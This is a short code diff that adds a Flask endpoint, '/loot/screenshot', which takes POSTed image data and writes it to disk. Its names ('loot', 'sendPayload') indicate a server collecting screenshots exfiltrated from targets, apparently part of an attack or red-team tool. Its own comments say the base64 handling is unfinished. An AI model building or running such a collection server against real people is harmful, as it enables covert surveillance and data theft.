@@ -65,6 +65,23 @@ def sendPayload():
 
 
 
+# Capture screenshot
+@app.route('/loot/screenshot', methods=['POST'])
+def recordScreenshot():
+    image = request.data
+    #console.log("Received image size: " + str(len(image)))
+    #print("Received image: " + str(image))
+
+    # write the file
+    # Ok, this is writing out base64 string of data string. 
+    # Needs conversion
+    print("Writing the file to disk...")
+    with open ("./lootScreenshot.png", "wb") as binary_file:
+        binary_file.write(image)
+        binary_file.close()
+
+    return "ok", 200
+
 
 
 if __name__ == '__main__':
